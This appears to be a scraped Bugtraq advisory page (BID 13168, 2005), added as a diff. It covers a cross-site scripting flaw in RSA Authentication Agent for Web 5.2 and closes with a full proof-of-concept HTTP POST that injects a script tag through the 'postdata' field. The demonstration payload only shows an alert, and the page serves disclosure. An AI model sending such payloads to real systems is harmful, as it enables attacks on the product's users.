@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid13168<p><b><span style="font-size: 18pt;">RSA Security RSA Authentication Agent For Web Remote Cross-Site Scripting Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13168/info">info</a><br><a href="http://www.securityfocus.com/bid/13168/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13168/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13168/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13168/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13168
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 14 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 14 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Oliver Karow &lt;oliver.karow@gmx.de&gt; is credited with the discovery of this issue.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Rsa RSA Authentication Agent for Web 5.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage this issue.  The following proof of concept has been made available:<br/><br/>POST /WebID/IISWebAgentIF.dll HTTP/1.0<br/>Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,<br/>application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword,<br/>application/x-shockwave-flash, */*<br/>Accept-Language: de<br/>Content-Type: application/x-www-form-urlencoded<br/>Connection: Keep-Alive<br/>User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)<br/>Host: www.example.com<br/>Cache-Control: no-cache<br/>Referer: https://www.example.com/<br/>Content-Length: 135<br/><br/>stage=useridandpasscode&amp;referrer=Z2F&amp;sessionid=0&amp;postdata="&gt;&lt;script&gt;alert("Vulnerable")&lt;/script&gt;&amp;authntype=2&amp;username=asdf&amp;passcode=jkl%F6
+	
+		<ul>
+</ul>
+</div>
